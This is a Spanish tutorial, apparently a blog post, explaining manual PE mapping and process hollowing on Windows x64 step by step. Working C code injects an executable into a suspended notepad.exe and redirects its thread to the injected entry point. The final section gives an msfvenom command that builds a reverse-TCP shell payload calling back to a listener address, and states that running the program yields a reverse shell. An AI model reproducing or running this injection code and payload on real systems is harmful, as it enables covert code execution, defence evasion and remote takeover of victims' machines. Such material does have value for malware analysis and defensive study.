# Manual Mapping en Windows x64
## 1. Introducción
### 1.1 ¿Qué es un archivo PE (Portable Executable)?

Un **archivo PE** es el formato estándar que usan los ejecutables de Windows (`.exe`, `.dll`, `.sys`, etc.). Es la estructura que **define cómo cargar y ejecutar un programa en memoria**.

### 1.2 ¿Qué es el Manual Mapping?

El Manual Mapping es una técnica avanzada para inyectar un ejecutable (PE) dentro de otro proceso sin usar funciones del sistema operativo como `LoadLibrary`.

---
## 2. Funcionamiento del programa

### 2.1 Lectura del archivo ejecutable (payload.exe)

Primero, definimos la ruta del archivo ejecutable que queremos cargar manualmente:

```c
const char* rutaPayload = "C:\\Users\\aaron\\source\\repos\\Hollowing\\payload.exe";
```

1. **Abrir el archivo**  
    Utilizamos la función `CreateFileA` para abrir el archivo en modo lectura y escritura (`GENERIC_READ | GENERIC_WRITE`), con permiso para que otros procesos solo lean mientras está abierto (`FILE_SHARE_READ`).  

```c
HANDLE hFile = CreateFileA(rutaPayload, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
if (hFile == INVALID_HANDLE_VALUE) {
    printf("[-] Error al abrir el archivo: %lu\n", GetLastError());
    return 1;
}
```

2. **Obtener el tamaño del archivo**  
    Se usa `GetFileSize` para conocer cuántos bytes ocupa el archivo en disco.
    

```c
DWORD sFile = GetFileSize(hFile, NULL);
```

3. **Reservar memoria dinámica para almacenar el archivo**  
    Se reserva un bloque de memoria en el heap con `malloc` del tamaño exacto del archivo para almacenar su contenido.
    

```c
BYTE* buffer = (BYTE*)malloc(sFile);
```

4. **Leer el contenido del archivo en memoria**  
    La función `ReadFile`usa el handle del archivo para leer y copiar los bytes en el buffer asignado previamente. La variable `bytesLeidos` indicará cuántos bytes fueron efectivamente leídos.  
    Si `ReadFile` falla, imprime el error y termina la ejecución.
    

```c
DWORD bytesLeidos;
if (!ReadFile(hFile, buffer, sFile, &bytesLeidos, NULL)) {
    printf("[-] Error al almacenar los datos en el buffer: %lu\n", GetLastError());
    return 1;
}
```

### 2.2 Creación de un proceso en estado suspendido y reserva de memoria en su espacio

#### 2.2.1 **Estructuras necesarias**



```c
STARTUPINFOA si = { 0 };
PROCESS_INFORMATION pi = { 0 };
```

Se inicializan las estructuras `STARTUPINFOA` y `PROCESS_INFORMATION` para crear un proceso:

- `STARTUPINFOA`: contiene información de cómo debe iniciarse la ventana del nuevo proceso (aunque aquí no se usa ninguna configuración especial).
    
- `PROCESS_INFORMATION`: recibirá información del proceso e hilo creados, como su manejador (`hProcess`) y su hilo principal (`hThread`).
    

#### 2.2.2 **Crear el proceso en modo suspendido**

```c
if (!CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
    printf("[-] Error creando el proceso: %lu\n", GetLastError());
    return 1;
}
```

Se crea un nuevo proceso (`notepad.exe`) en estado **suspendido** con `CREATE_SUSPENDED`. 


#### 2.2.3 **Reservar memoria en el proceso remoto**

```c
LPVOID memReservada = VirtualAllocEx(pi.hProcess, NULL, nt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
if (!memReservada) {
    printf("[-] Error reservando memoria: %lu\n", GetLastError());
    return 1;
}
```

- `VirtualAllocEx` se usa para **reservar un bloque de memoria en el espacio del proceso recién creado (`pi.hProcess`).
    
- El tamaño de la memoria se toma directamente del campo `SizeOfImage` del archivo ejecutable que queremos mapear. Este valor indica cuánto ocupará el ejecutable cargado en memoria (cabeceras + secciones).

### 2.3 Escritura Manual de Cabeceras y Secciones del Ejecutable en el Proceso Remoto

#### 2.3.1 Escribir los encabezados del ejecutable en el proceso remoto

```c
if (!WriteProcessMemory(pi.hProcess, memReservada, buffer, nt->OptionalHeader.SizeOfHeaders, NULL)) {
    printf("[-] Error escribiendo headers\n");
    return 1;
}
printf("[+] Header escritos correctamente en memoria\n");
```

**Objetivo:** Copiar las cabeceras del ejecutable (cabecera DOS, NT y tabla de secciones) desde el ejecutable cargado en memoria (variable `buffer`) hacia el espacio reservado en el proceso remoto (variable `memReservada`).

- `buffer` contiene en memoria el ejecutable completo, que fue leído desde disco.
    
- `memReservada` es la dirección base asignada en el proceso remoto, obtenida con `VirtualAllocEx`.
    
- `SizeOfHeaders` es el tamaño total de las cabeceras, definido en el campo `OptionalHeader` del encabezado NT.
    


#### 2.3.2 Escribir las secciones del ejecutable en el proceso remoto

```c
for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
    LPVOID destino = (LPVOID)((BYTE*)memReservada + secciones[i].VirtualAddress);
    LPVOID origen = buffer + secciones[i].PointerToRawData;
    SIZE_T tam = secciones[i].SizeOfRawData;

    if (!WriteProcessMemory(pi.hProcess, destino, origen, tam, NULL)) {
        printf("[-] Error escribiendo sección %lu\n", GetLastError());
        return 1;
    }

    pprintf("[+] Seccion: %s escrita correctamente | RawOffset: 0x%08X | VA: 0x%08X | Tamano: %Iu bytes | Origen: 0x%p | Destino: 0x%p\n", secciones[i].Name, secciones[i].PointerToRawData, secciones[i].VirtualAddress, tam, origen, destino);
}
```

**Explicación:**

- El bucle recorre cada sección del ejecutable cargado.
    
- `destino` representa la dirección virtual dentro del proceso remoto en la que debe ubicarse la sección. Se obtiene sumando la base de memoria remota (`memReservada`) con el offset virtual de la sección (`VirtualAddress`).
    
- `origen` es la dirección en el `buffer` local donde se encuentra el contenido de la sección. Se obtiene sumando el puntero al buffer con el offset físico en disco de la sección (`PointerToRawData`).
    
- `tam` indica el tamaño real en bytes que ocupa la sección en el archivo en disco (`SizeOfRawData`).
    

`WriteProcessMemory` copia cada sección a la memoria remota para que el ejecutable esté completamente cargado y estructurado como si el sistema operativo lo hubiera cargado de forma legítima.

### 2.4 Redirección del Hilo al EntryPoint del Binario Inyectado

Una vez que el binario ha sido cargado manualmente en el espacio de memoria del proceso remoto, el siguiente paso consiste en **redirigir el flujo de ejecución del hilo principal** hacia el **punto de entrada (EntryPoint)** del ejecutable inyectado. Para ello, se utiliza el contexto del hilo:

```c
CONTEXT contexto = { 0 };
contexto.ContextFlags = CONTEXT_FULL;
```

Se inicializa una estructura `CONTEXT`, que representa el estado completo de los registros del hilo (registros generales, de pila, de segmento, etc.). Establecer `CONTEXT_FULL` en `ContextFlags` permite obtener y modificar todos los registros necesarios.

#### 2.4.1 Obtener el contexto del hilo

```c
GetThreadContext(pi.hThread, &contexto);
```

Esta función recupera el estado actual de los registros del hilo en suspensión (`pi.hThread`). Es indispensable hacerlo **antes de reanudar el hilo**, para poder redirigirlo correctamente.

#### 2.4.2 Redirigir al EntryPoint

```c
contexto.Rip = (DWORD64)((BYTE*)memReservada + nt->OptionalHeader.AddressOfEntryPoint);
```

Aquí se modifica el registro `RIP` (Instruction Pointer) del hilo. En sistemas Windows x64, `RIP` es el registro que indica la dirección de la próxima instrucción que el procesador va a ejecutar. Lo que se hace es:

- **`memReservada`**: la dirección base donde se cargó el binario en el proceso remoto (equivalente al `ImageBase`).
    
- **`AddressOfEntryPoint`**: el offset del punto de entrada dentro del ejecutable (RVA).
    
- Al sumarlos, se obtiene la **dirección absoluta del EntryPoint**, a la que queremos que el hilo salte.
    

Esto garantiza que cuando se reanude el hilo, la ejecución empiece directamente desde el binario inyectado.

> _Nota:_ También podría usarse el registro `RCX` como punto de entrada en ciertas circunstancias, como cuando se trata de una llamada indirecta o si se quiere invocar manualmente una función (por eso aparece comentado como alternativa).

#### 2.4.3 Establecer el nuevo contexto

```c
SetThreadContext(pi.hThread, &contexto);
```

Esta función aplica los cambios realizados sobre los registros del hilo. A partir de este momento, el hilo queda listo para ejecutar el código del ejecutable cargado manualmente.

#### 2.4.4 Reanudar el hilo

```c
ResumeThread(pi.hThread);
```

Cuando se crea un proceso con la bandera `CREATE_SUSPENDED`, su hilo principal no empieza a ejecutarse inmediatamente. Esto permite hacer modificaciones antes de que el proceso comience su ejecución real.

---
## 3. Ejecución del programa

El portable ejecutable que estamos usando está generado con msfvenom:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.29 LPORT=4444 -f exe -o payload.exe
```

Una vez ya tenemos generado el PE, tenemos que poner la ruta del archivo en el código.

![[1.png]]

Y ya con solo compilar y ejecutar el programa en este caso podríamos obtener una reverse shell.

![[2.png]]

El código está disponible en mi github:

https://github.com/KikoVaquero/manualPEmapping
